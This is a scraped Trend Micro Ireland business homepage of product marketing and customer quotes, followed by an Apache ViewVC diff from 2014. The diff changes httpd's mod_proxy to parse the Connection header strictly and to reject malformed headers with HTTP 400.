* [Learn more](/en_ie/business/products/user-protection/sps/email-and-collaboration.html)

![Trend logo](/content/dam/trendmicro/global/en/core/images/logos/t-logotype/transparent-white-t-with-grey-accents.png)

I'm sorry; your browser doesn't support HTML video.

![Mitre badge](https://trendmicro.scene7.com/is/image/trendmicro/mitre-engenuity-badge?scl=1.0&qlt=95&fmt=webp-alpha)

**100% Detection. 100% Confidence.**

Trend Vision One™ crushed the 2024 MITRE Engenuity™ ATT&CK Evaluations, excelling against the most sophisticated attack scenarios.

* [See results](/en_ie/business/campaigns/mitre-engenuity-evaluations.html)

![Mitre badge](https://trendmicro.scene7.com/is/image/trendmicro/mitre-logo-gradient?scl=1.0&qlt=95&fmt=webp-alpha)

![artificial future](/content/dam/trendmicro/global/en/business/homepage-heros/artificial-future.png)

# 2025 Security Predictions

Discover the critical cyber threats and trends shaping an AI-driven landscape.

* [See into the future](https://www.trendmicro.com/vinfo/ie/security/news/security-predictions/the-artificial-future-trend-micro-security-predictions-for-2025)

Trending topics

[Trend Micro and CISA Secure-By-Design Pledge

2025/01/23](https://www.trendmicro.com/en_ie/research/25/a/cisa-secure-design-pledge.html)

[Invisible Prompt Injection: A Threat to AI Security

2025/01/22](https://www.trendmicro.com/en_ie/research/25/a/invisible-prompt-injection-secure-ai.html)

[IoT Botnet Linked to Large-scale DDoS Attacks Since the End of 2...

2025/01/17](https://www.trendmicro.com/en_ie/research/25/a/iot-botnet-linked-to-ddos-attacks.html)

Earlier detection. Faster response. Reduced risk.

Stop adversaries faster and consolidate cybersecurity with the AI-powered Trend Vision One™ Platform.

**Reduce cybersecurity costs by 70%   •   Reduce alerts from 1000 to 4 per day   •   65% reduction of dwell time**

* [Watch demo](/content/dam/trendmicro/global/en/core/videos/overview/overview-trend-vison-one-platform.mp4)
* [Try free](/en_ie/business/products/trials.html)
* [Learn more](/en_ie/business/products/one-platform.html)

![Trend Vision One Marketecture](/content/dam/trendmicro/global/en/core/images/diagram/trend-vision-one-marketecture-diagram.svg)

MAXIMIZE EFFECTIVENESS

**Cybersecurity solutions for the cyber threats of today and tomorrow**

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Detect and respond to cyber threats faster

Tackle the challenges of simplifying threat detection and response and leveraging AI/ML models to reduce the constraints on SOC and IT security teams.

[trending\_flat](/en_ie/business/solutions/challenges/detection-response.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Understand, prioritize, and mitigate risk

Meet your solution consolidation goals, compliance requirements, and cyber insurance conditions through continuous attack surface management.

[trending\_flat](/en_ie/business/solutions/challenges/cyber-risk.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Secure your borderless workforce

Mitigate risk from your users and the tools they rely on to be productive, wherever they are with identity, endpoint, email, mobile, and web protection.

[trending\_flat](/en_ie/business/solutions/challenges/infrastructure-security.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Protect your hybrid multi-cloud world

Discover how to realize the benefits of the cloud while seamlessly protecting your cloud environments.

[trending\_flat](/en_ie/business/solutions/challenges/hybrid-cloud.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Protect your cloud-native apps

Achieve complete visibility and control of your applications' security at every stage of their lifecycle.

[trending\_flat](/en_ie/business/solutions/challenges/cloud-native-applications.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Eliminate network blind spots

Leverage high-performance protection that is purpose-built for the entirety of your network environment, from the cloud to the data center to the factory floor.

[trending\_flat](/en_ie/business/solutions/challenges/network-security.html)

WE'VE GOT YOU COVERED

**Augment your security teams with 24/7 managed detection, response, and support.**

Extend your team, swiftly detect and respond to threats, and improve the agility of your security posture with premium support, managed XDR, and incident response services.

* [See how](/en_ie/business/services/managed-xdr.html)

SOLUTIONS BY ROLE

Stay ahead of any security challenge

![CISO](/content/dam/trendmicro/global/en/core/images/icons/branded/ciso-icn.svg)

CISO

Security excellence is within reach. Discover market-leading XDR, dynamic ASRM, and purpose-build solutions to meet your needs today and tomorrow.

* [Learn more](/en_ie/business/solutions/role/ciso.html)

![SOC Managers](/content/dam/trendmicro/global/en/core/images/icons/branded/soc-manager-icn.svg)

SOC Managers

Overcome siloes, complexity, and your growing attack surface to stop adversaries faster with a unified cybersecurity platform.

* [Learn more](/en_ie/business/solutions/role/soc.html)

![Cloud SecOps](/content/dam/trendmicro/global/en/core/images/icons/branded/cloud-secops-icn.svg)

**Cloud SecOps**

Gain full visibility and control to resolve multi-cloud complexity, so you can achieve compliance and secure cloud-native apps.

* [Learn more](/en_ie/business/solutions/role/cloud-operations.html)

![Cloud Developer](/content/dam/trendmicro/global/en/core/images/icons/branded/cloud-developer-icn.svg)

Cloud Developer

Balance security asks while delivering innovative, on-time apps so you can build securely—your way.

* [Learn more](/en_ie/business/solutions/role/cloud-developer.html)

![Infrastructure Manager](/content/dam/trendmicro/global/en/core/images/icons/branded/infrastructure-manager-icn.svg)

Infrastructure

Managers

Evolve your security to protect more with less, enabling you to mitigate threats quickly and effectively.

* [See how](/en_ie/business/solutions/role/it-infrastructure-operations.html)

SUCCESS STORIES

How 500,000+ companies worldwide stay ahead of threats with Trend Micro

[![Panasonic logo](https://trendmicro.scene7.com/is/image/trendmicro/panasonic-white-grid-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"The XDR platform allowed us to connect endpoints, network sensors, and email, providing a single screen for visibility and action."](/en_ie/about/customer-stories/panasonic-north-america.html)

[![Weatherford Independent School District logo](https://trendmicro.scene7.com/is/image/trendmicro/weatherford-school-district-grid-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"After doing some research, I realized no other platform offered the equivalent capability of Trend Micro Vision One."](/en_ie/about/customer-stories/weatherford-independent-school-district.html)

[![Fischer Homes logo](https://trendmicro.scene7.com/is/image/trendmicro/fischer-homes-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"Our cybersecurity posture is significantly stronger than it was 4 years ago."](/en_ie/about/customer-stories/fischer-homes.html)

[![Summit Carbon logo](https://trendmicro.scene7.com/is/image/trendmicro/summit-carbon-transparent-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"Trend Vision One is amazing. [It gives] the ability to see and track a threat from potential to attack."](/en_ie/about/customer-stories/summit-carbon-solutions.html)

[![Decathlon logo](https://trendmicro.scene7.com/is/image/trendmicro/decathlon-white-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"We found Trend Vision One and Cloud App Security to secure our 100,000 Google users, easy to set up and deploy—which has been a major advantage."](/en_ie/about/customer-stories/decathlon.html)

[![KNMI logo](https://trendmicro.scene7.com/is/image/trendmicro/knmi-transparent-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"Trend focuses broadly on all security aspects of the multi-cloud, not just on one small piece. That’s exactly what the KNMI was looking for."](/en_ie/about/customer-stories/knmi.html)

[![Xsolis](/content/dam/trendmicro/global/en/about/customer-stories/xsolis/xsolis-logo-white.svg)

"Trend has allowed us to sleep at night knowing that its security solutions are running 24/7. Companies that don’t take security seriously and invest wisely are taking on a much higher risk."](/en_ie/about/customer-stories/xsolis.html)

[![atlassian](/content/dam/trendmicro/global/en/about/customer-stories/atlassian/atlassian-logo-white.svg)

"We now have ongoing assurance that our cloud infrastructure is in a good and secure state."](/en_ie/about/customer-stories/atlassian.html)

[![SBV logo](/content/dam/trendmicro/global/en/about/customer-stories/dhr/dhr-logo-white.svg)

"My team has gotten 20 percent of its time back, allowing me to leverage their quality and move from being reactive to being proactive."](/en_ie/about/customer-stories/doctors-hospital-renaissance-health.html)

[![SBV logo](https://trendmicro.scene7.com/is/image/trendmicro/sbv-white-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"Since deploying Trend Micro, we’ve recorded millions of attacks, stopped 117,000 threats in one day, and had zero infections in 18 months. Trend Micro is always working, even while I’m sleeping."](/en_ie/about/customer-stories/sbv-services.html)

[![Ricoh](/content/dam/trendmicro/global/en/about/customer-stories/ricoh/ricoh-logo-white.svg)

"Ricoh USA uses Trend to drive a security-first culture to protect its environment."](/en_ie/about/customer-stories/ricoh-usa.html)

![Banijay Logo](/content/dam/trendmicro/global/en/about/customer-stories/banijay/banijay-gray.svg)

![Cox Logo](/content/dam/trendmicro/global/en/about/customer-stories/cox-group/cox-gray.svg)

![City of Columbia Logo](/content/dam/trendmicro/global/en/about/customer-stories/city-of-columbia/city-of-columbia-gray.svg)

![Databank logo](/content/dam/trendmicro/global/en/about/customer-stories/databank/databank-gray.svg)

![Decathlon logo](/content/dam/trendmicro/global/en/about/customer-stories/decathlon/decatholon-gray.svg)

![Dekalb County Schools District](/content/dam/trendmicro/global/en/about/customer-stories/dekalb-county-schools-district/delkab-county-gray.svg)

![DHR logo](/content/dam/trendmicro/global/en/about/customer-stories/dhr/dhr-gray.svg)

![Ellos Group ](/content/dam/trendmicro/global/en/about/customer-stories/ellos-group/ellos-group-gray.svg)

![Flowserve logo](/content/dam/trendmicro/global/en/about/customer-stories/flowserve/flowserve-gray.svg)

![Fujitsu logo](/content/dam/trendmicro/global/en/about/customer-stories/fujitsu/fujitsu-gray.svg)

![Matas logo](/content/dam/trendmicro/global/en/about/customer-stories/matas/matas-gray.svg)

![Nuffield Health logo](/content/dam/trendmicro/global/en/about/customer-stories/nuffield-health/nuffeild-health-gray.svg)

![Panasonic logo](/content/dam/trendmicro/global/en/about/customer-stories/panasonic-north-america/panasonic-gray.svg)

![Pizza Pizza logo](/content/dam/trendmicro/global/en/about/customer-stories/pizza-pizza/pizza-pizza-gray.svg)

![Ricoh USA logo](/content/dam/trendmicro/global/en/about/customer-stories/ricoh-usa/ricoh-gray.svg)

![ROC Oil logo](/content/dam/trendmicro/global/en/about/customer-stories/roc-oil/roc-gray.svg)

![Seneca College logo](/content/dam/trendmicro/global/en/about/customer-stories/seneca-college/seneca-gray.svg)

![State Bank of India logo](/content/dam/trendmicro/global/en/about/customer-stories/state-bank-of-india/sbi-gray.svg)

Cybersecurity insights

The latest research and expert perspectives

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

The Artificial Future: 2025 Security Predictions

Discover the critical cyber threats and trends shaping an AI-driven landscape.

* [Read blog](https://www.trendmicro.com/vinfo/ie/security/research-and-analysis/predictions/the-artificial-future-trend-micro-security-predictions-for-2025)

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

See Why Customers Choose Us

Check out an easy-to-scan comparison of how we outperform the competition on multiple fronts

* [Learn more](/en_ie/about/compare.html)

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

AI Pulse: What's New in AI Regulations

AI regulation is here to stay

* [Read more](/en_ie/research/24/i/ai-regulations-2024.html)

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

Diving Deep Into Quantum Computing

An exploration of computing with quantum mechanics

* [Learn more](https://www.trendmicro.com/vinfo/ie/security/news/security-technology/diving-deep-into-quantum-computing-computing-with-quantum-mechanics)

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

2024 Cyber Risk Report

Discover proactive mitigation strategies and gain actionable insights

* [Read the report](https://www.trendmicro.com/vinfo/ie/security/news/cybercrime-and-digital-threats/intercepting-impact-2024-trend-micro-cyber-risk-report)

OUR IMPACT

The proof is in the numbers

6.5T+

Threat queries collected in 2023 alone

160B+

Threats blocked in 2023 alone

#1

Leader in Cloud Security

500K+

Global enterprise customers

* [See how](/content/dam/trendmicro/global/en/core/videos/overview/tm-why-we-are-a-leader-accolades.mp4)

###### JOIN 500K+ GLOBAL CUSTOMERS

Get started with Trend today

* [Let's talk](/en_ie/business/get-info-form.html)

### Resources

* [Blog](/en_ie/research.html)
* [Newsroom](/en_ie/about/newsroom.html)
* [Threat Reports](https://www.trendmicro.com/vinfo/ie/security/research-and-analysis/threat-reports)
* [Find a Partner](https://partner.trendmicro.com/partner-locator-home/)

### Support

* [Business Support Portal](https://success.trendmicro.com/en-US/)
* [Contact Us](/en_ie/business/get-info-form.html)
* [Downloads](/en_ie/business/products/downloads.html)
* [Free Trials](/en_ie/business/products/trials.html)

### About Trend

* [About Us](/en_ie/about.html)
* [Careers](/en_ie/about/careers.html)
* [Locations](/en_ie/contact.html)
* [Upcoming Events](/en_ie/about/events.html)
* [Trust Center](/en_ie/about/trust-center.html)

### Country Headquarters

* Trend Micro - Ireland (IE)
* Median House, Cork Business & Technology Park,
  Model Farm Road

  Cork, Ireland
* Phone:: +353 (0)21 730 7300

Select a country / region

expand\_more

close
#### The Americas

* [United States](/en_us.html)
* [Brasil](/pt_br.html)
* [Canada](/en_ca.html)
* [México](/es_mx.html)

#### Middle East & Africa

* [South Africa](/en_za.html)
* [Middle East and North Africa](/en_ae.html)

#### Europe

* [België (Belgium)](/en_be.html)
* [Česká Republika](http://www.trendmicro.cz/)
* [Danmark](/en_dk.html)
* [Deutschland, Österreich Schweiz](/de_de.html)
* [España](/es_es.html)
* [France](/fr_fr.html)
* [Ireland](/en_ie.html)
* [Italia](/it_it.html)
* [Nederland](/en_nl.html)
* [Norge (Norway)](/en_no.html)
* [Polska (Poland)](/pl_pl.html)
* [Suomi (Finland)](/en_fi.html)
* [Sverige (Sweden)](/en_se.html)
* [Türkiye (Turkey)](/tr_tr.html)
* [United Kingdom](/en_gb.html)

#### Asia & Pacific

* [Australia](/en_au.html)
* [Центральная Азия (Central Asia)](/ru_ru.html)
* [Hong Kong (English)](/en_hk.html)
* [香港 (中文) (Hong Kong)](/zh_hk.html)
* [भारत गणराज्य (India)](/en_in.html)
* [Indonesia](/in_id.html)
* [日本 (Japan)](/ja_jp.html)
* [대한민국 (South Korea)](/ko_kr/business.html)
* [Malaysia](/en_my.html)
* [Монголия (Mongolia) and рузия (Georgia)](/en_us.html)
* [New Zealand](/en_nz.html)
* [Philippines](/en_ph.html)
* [Singapore](/en_sg.html)
* [台灣 (Taiwan)](/zh_tw.html)
* [ประเทศไทย (Thailand)](/th_th.html)
* [Việt Nam](/vi_vn.html)

Experience our unified platform for free

* [Claim your 30-day trial](/en_ie/business/products/trials.html)

* [Privacy](/en_ie/about/trust-center/privacy.html)
* [Legal](/en_ie/about/legal.html)
* [Terms of Use](/en_ie/about/legal/terms-of-use.html)
* [Sitemap](/en_ie/business/sitemap.html)

Copyright ©2025 Trend Micro Incorporated. All rights reserved.

sXpIBdPeKzI9PC2p0SWMpUSM2NSxWzPyXTMLlbXmYa0R20xk



=== Content from svn.apache.org_24d540df_20250125_143736.html ===


| **[/](/viewvc?diff_format=h&view=roots)[[Apache-SVN]](/viewvc/?diff_format=h)/[httpd](/viewvc/httpd/?diff_format=h)/[httpd](/viewvc/httpd/httpd/?diff_format=h)/[trunk](/viewvc/httpd/httpd/trunk/?diff_format=h)/[modules](/viewvc/httpd/httpd/trunk/modules/?diff_format=h)/[proxy](/viewvc/httpd/httpd/trunk/modules/proxy/?diff_format=h)/[proxy\_util.c](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?diff_format=h&view=log)** |  |
| --- | --- |

[![ViewVC logotype](/vc-static/images/viewvc-logo.png)](http://www.viewvc.org/ "ViewVC Home")
# Diff of /httpd/httpd/trunk/modules/proxy/proxy\_util.c

[![Parent Directory](/vc-static/images/back_small.png) Parent Directory](/viewvc/httpd/httpd/trunk/modules/proxy/?diff_format=h)
| [![Revision Log](/vc-static/images/log.png) Revision Log](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?diff_format=h&view=log)
| [![View Patch](/vc-static/images/diff.png) Patch](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1609680&r2=1610674&view=patch)

###

|  | revision [1609680](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?diff_format=h&revision=1609680&view=markup) by *jkaluza*, Fri Jul 11 10:36:15 2014 UTC | revision [1610674](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?diff_format=h&revision=1610674&view=markup) by *jorton*, Tue Jul 15 12:27:00 2014 UTC |
| --- | --- | --- |
| **#** | **Line 3218**   PROXY\_DECLARE(proxy\_balancer\_shared \*) a | **Line 3218**   PROXY\_DECLARE(proxy\_balancer\_shared \*) a |
| [3218](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3218) | typedef struct header\_connection { | typedef struct header\_connection { |
| [3219](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3219) | apr\_pool\_t \*pool; | apr\_pool\_t \*pool; |
| [3220](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3220) | apr\_array\_header\_t \*array; | apr\_array\_header\_t \*array; |
| [3221](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3221) | const char \*first; | const char \*error; |
| [3222](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3222) | unsigned int closed:1; | int is\_req; |
| [3223](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3223) | } header\_connection; | } header\_connection; |
| [3224](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3224) |  |  |
| [3225](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3225) | static int find\_conn\_headers(void \*data, const char \*key, const char \*val) | static int find\_conn\_headers(void \*data, const char \*key, const char \*val) |
| [3226](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3226) | { | { |
| [3227](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3227) | header\_connection \*x = data; | header\_connection \*x = data; |
| [3228](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3228) | const char \*name; | x->error = ap\_parse\_token\_list\_strict(x->pool, val, &x->array, !x->is\_req); |
| [3229](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3229) |  | return !x->error; |
|  | do { |  |
|  | while (\*val == ',') { |  |
|  | val++; |  |
|  | } |  |
|  | name = ap\_get\_token(x->pool, &val, 0); |  |
|  | if (!strcasecmp(name, "close")) { |  |
|  | x->closed = 1; |  |
|  | } |  |
|  | if (!x->first) { |  |
|  | x->first = name; |  |
|  | } |  |
|  | else { |  |
|  | const char \*\*elt; |  |
|  | if (!x->array) { |  |
|  | x->array = apr\_array\_make(x->pool, 4, sizeof(char \*)); |  |
|  | } |  |
|  | elt = apr\_array\_push(x->array); |  |
|  | \*elt = name; |  |
|  | } |  |
|  | } while (\*val); |  |
|  |  |  |
|  | return 1; |  |
| [3230](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3230) | } | } |
| [3231](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3231) |  |  |
| [3232](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3232) | /\*\* | /\*\* |
| [3233](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3233) | \* Remove all headers referred to by the Connection header. | \* Remove all headers referred to by the Connection header. |
| [3234](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3234) |  | \* Returns -1 on error. Otherwise, returns 1 if 'Close' was seen in |
| [3235](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3235) |  | \* the Connection header tokens, and 0 if not. |
| [3236](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3236) | \*/ | \*/ |
| [3237](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3237) | static int ap\_proxy\_clear\_connection(request\_rec \*r, apr\_table\_t \*headers) | static int ap\_proxy\_clear\_connection(request\_rec \*r, apr\_table\_t \*headers) |
| [3238](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3238) | { | { |
| [3239](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3239) | const char \*\*name; | int closed = 0; |
| [3240](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3240) | header\_connection x; | header\_connection x; |
| [3241](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3241) |  |  |
| [3242](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3242) | x.pool = r->pool; | x.pool = r->pool; |
| [3243](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3243) | x.array = NULL; | x.array = NULL; |
| [3244](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3244) | x.first = NULL; | x.error = NULL; |
| [3245](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3245) | x.closed = 0; | x.is\_req = (headers == r->headers\_in); |
| [3246](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3246) |  |  |
| [3247](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3247) | apr\_table\_unset(headers, "Proxy-Connection"); | apr\_table\_unset(headers, "Proxy-Connection"); |
| [3248](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3248) |  |  |
| [3249](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3249) | apr\_table\_do(find\_conn\_headers, &x, headers, "Connection", NULL); | apr\_table\_do(find\_conn\_headers, &x, headers, "Connection", NULL); |
|  | if (x.first) { |  |
|  | /\* fast path - no memory allocated for one header \*/ |  |
| [3250](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3250) | apr\_table\_unset(headers, "Connection"); | apr\_table\_unset(headers, "Connection"); |
| [3251](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3251) | apr\_table\_unset(headers, x.first); |  |
| [3252](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3252) |  | if (x.error) { |
| [3253](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3253) |  | ap\_log\_rerror(APLOG\_MARK, APLOG\_NOTICE, 0, r, APLOGNO() |
| [3254](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3254) |  | "Error parsing Connection header: %s", x.error); |
| [3255](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3255) |  | return -1; |
| [3256](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3256) | } | } |
| [3257](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3257) |  |  |
| [3258](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3258) | if (x.array) { | if (x.array) { |
| [3259](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3259) | /\* two or more headers \*/ | int i; |
| [3260](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3260) | while ((name = apr\_array\_pop(x.array))) { | for (i = 0; i < x.array->nelts; i++) { |
| [3261](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3261) | apr\_table\_unset(headers, \*name); | const char \*name = APR\_ARRAY\_IDX(x.array, i, const char \*); |
| [3262](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3262) |  | ap\_log\_rerror(APLOG\_MARK, APLOG\_DEBUG, 0, r, APLOGNO() |
| [3263](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3263) |  | "Removing header '%s' listed in Connection header", |
| [3264](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3264) |  | name); |
| [3265](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3265) |  | if (!strcasecmp(name, "close")) { |
| [3266](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3266) |  | closed = 1; |
| [3267](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3267) |  | } |
| [3268](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3268) |  | apr\_table\_unset(headers, name); |
| [3269](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3269) | } | } |
| [3270](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3270) | } | } |
| [3271](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3271) |  |  |
| [3272](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3272) | return x.closed; | return closed; |
| [3273](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3273) | } | } |
| [3274](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3274) |  |  |
| [3275](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3275) | PROXY\_DECLARE(int) ap\_proxy\_create\_hdrbrgd(apr\_pool\_t \*p, | PROXY\_DECLARE(int) ap\_proxy\_create\_hdrbrgd(apr\_pool\_t \*p, |
| **#** | **Line 3487**   PROXY\_DECLARE(int) ap\_proxy\_create\_hdrbr | **Line 3477**   PROXY\_DECLARE(int) ap\_proxy\_create\_hdrbr |
| [3477](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3477) | } | } |
| [3478](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3478) |  |  |
| [3479](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3479) | proxy\_run\_fixups(r); | proxy\_run\_fixups(r); |
| [3480](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3480) | ap\_proxy\_clear\_connection(r, r->headers\_in); | if (ap\_proxy\_clear\_connection(r, r->headers\_in) < 0) { |
| [3481](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3481) |  | return HTTP\_BAD\_REQUEST; |
| [3482](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3482) |  | } |
| [3483](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3483) |  |  |
| [3484](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3484) | /\* send request headers \*/ | /\* send request headers \*/ |
| [3485](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674&diff_format=h#l3485) | headers\_in\_array = apr\_table\_elts(r->headers\_in); | headers\_in\_array = apr\_table\_elts(r->headers\_in); |

---

| Colored Diff Long Colored Diff Full Colored Diff Unidiff Context Diff Side by Side | | Legend:  | Removed from v.1609680 |  | | --- | --- | | changed lines | | |  | Added in v.1610674 | | | --- | --- | --- | --- | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

---

| infrastructure at apache.org | **[ViewVC Help](/vc-static/help_rootview.html)** |
| --- | --- |
| Powered by [ViewVC 1.1.26](http://viewvc.tigris.org/) |  |


